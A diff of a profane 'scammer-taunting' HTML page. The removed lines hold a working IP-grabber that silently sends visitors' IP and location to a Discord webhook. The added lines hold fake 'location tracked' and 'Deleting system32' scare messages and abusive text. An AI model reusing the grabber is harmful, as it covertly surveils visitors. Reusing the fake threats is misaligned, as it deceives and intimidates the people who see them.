@@ -12,6 +12,7 @@
             font-family: "Courier New", Courier, monospace;
             text-align: center;
             padding: 50px;
+            overflow: hidden;
         }
         h1 {
             font-size: 3.5rem;
@@ -44,6 +45,42 @@
         a:hover {
             text-shadow: 0 0 10px lime;
         }
+        #countdown {
+            font-size: 2rem;
+            color: lime;
+            margin-top: 20px;
+        }
+        @keyframes matrix-fall {
+            from {
+                transform: translateY(-100%);
+            }
+            to {
+                transform: translateY(100%);
+            }
+        }
+        .matrix {
+            font-family: monospace;
+            font-size: 20px;
+            line-height: 1.5;
+            animation: matrix-fall 1s linear infinite;
+            color: lime;
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+        }
+        @media screen and (max-width: 600px) {
+            body {
+                padding: 20px;
+                font-size: 0.9rem;
+            }
+            h1 {
+                font-size: 2rem;
+            }
+            .scammer-gif {
+                width: 80%;
+            }
+        }
     </style>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script> <!-- Include jQuery -->
 </head>
@@ -52,51 +89,64 @@
     <p>Hey, you low-life, basement-dwelling piece of shit. Scamming people isn’t a career—it’s a cry for help.</p>
     <p class="burn">Do the world a favor and log the fuck off forever.</p>
     <img class="scammer-gif" src="https://media.giphy.com/media/VbnUQpnihPSIgIXuZv/giphy.gif" alt="Scammers Be Burning">
+    <p id="countdown">Tracking your location in 5 seconds...</p>
     <p>Need advice on your next scam? Sure:</p>
     <a href="https://www.google.com/search?q=how+to+stop+being+a+worthless+scammer" target="_blank">Click Here, Dumbass</a>
-
+    <div id="fake-virus" style="display: none; color: lime; font-family: monospace;">
+        <p>Starting system wipe...</p>
+        <p>Deleting system32...</p>
+        <p>Formatting C:/...</p>
+        <p style="color: red;">ERROR: User is too dumb to hack!</p>
+    </div>
+    <div id="chatbox" style="background: #222; padding: 10px; border: 2px solid crimson; width: 50%; margin: auto; color: lime; font-family: monospace;">
+        <p><b>Support Bot:</b> Hello! How can I help you?</p>
+    </div>
+    <div class="matrix">
+        1010101001010101100100101<br>
+        101001010100101010101101<br>
+        010101010101001010010101<br>
+    </div>
+    <p id="scammer-count" style="margin-top: 30px;">Scammers Tracked: 0</p>
+    <audio id="scammer-audio" autoplay>
+        <source src="https://www.myinstants.com/media/sounds/matrix.mp3" type="audio/mpeg">
+    </audio>
     <script>
-        // Function to check for a "key" parameter in the URL
-        function getQueryParam(param) {
-            const urlParams = new URLSearchParams(window.location.search);
-            return urlParams.get(param);
-        }
+        // Countdown Timer
+        let seconds = 5;
+        const countdownElement = document.getElementById("countdown");
+        const fakeVirus = document.getElementById("fake-virus");
+        const chatBox = document.getElementById("chatbox");
 
-        // Check for the secret key in the URL
-        const secretKey = getQueryParam("key");
-        const allowedKey = "friend"; // Replace with your own secret key
+        const interval = setInterval(() => {
+            seconds--;
+            countdownElement.textContent = `Tracking your location in ${seconds} seconds...`;
+            if (seconds <= 0) {
+                clearInterval(interval);
+                countdownElement.textContent = "Your location has been tracked!";
+                fakeVirus.style.display = "block"; // Show the fake virus message
+            }
+        }, 1000);
 
-        if (secretKey === allowedKey) {
-            console.log("Access detected with the secret key. Not sending info to Discord.");
-        } else {
-            // Geolocation script
-            $.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=YOUR_API_KEY", function(data) {
-                // Send the data to Discord webhook
-                var request = new XMLHttpRequest();
-                request.open("POST", "https://discord.com/api/webhooks/WEBHOOK_URL");
-                request.setRequestHeader('Content-type', 'application/json');
-                var payload = {
-                    username: "GrabUrMom",
-                    avatar_url: "https://previews.123rf.com/images/geotrac/geotrac1401/geotrac140100113/25298075-beautiful-hispanic-soccer-mom.jpg",
-                    embeds: [{
-                        color: "4700374",
-                        title: "YOU GOT INFO",
-                        fields: [
-                            {name: "IP", value: data.ip_address || "Unavailable"},
-                            {name: "CITY", value: data.city || "Unavailable"},
-                            {name: "COUNTRY", value: data.country || "Unavailable"},
-                            {name: "CONTINENT", value: data.continent || "Unavailable"}
-                        ],
-                        footer: {
-                            text: "By KazUpTV"
-                        }
-                    }]
-                };
-                request.send(JSON.stringify(payload));
-            }).fail(function() {
-                console.error("Failed to fetch geolocation data.");
-            });
-        }
+        // Fake Support Bot
+        setTimeout(() => {
+            const response = document.createElement("p");
+            response.innerHTML = `<b>Support Bot:</b> Oh, you're a scammer? Get lost.`;
+            chatBox.appendChild(response);
+        }, 3000);
+
+        // Scammer Leaderboard
+        let scammerCount = parseInt(localStorage.getItem("scammerCount")) || 0;
+        scammerCount++;
+        localStorage.setItem("scammerCount", scammerCount);
+        document.getElementById("scammer-count").textContent = `Scammers Tracked: ${scammerCount}`;
+
+        // Dynamic GIF
+        const gifArray = [
+            "https://media.giphy.com/media/VbnUQpnihPSIgIXuZv/giphy.gif",
+            "https://media.giphy.com/media/xT0xeMA62E1XIlup68/giphy.gif",
+            "https://media.giphy.com/media/26ufdipQqU2lhNA4g/giphy.gif"
+        ];
+        document.querySelector(".scammer-gif").src = gifArray[Math.floor(Math.random() * gifArray.length)];
     </script>
 </body>
 </html>
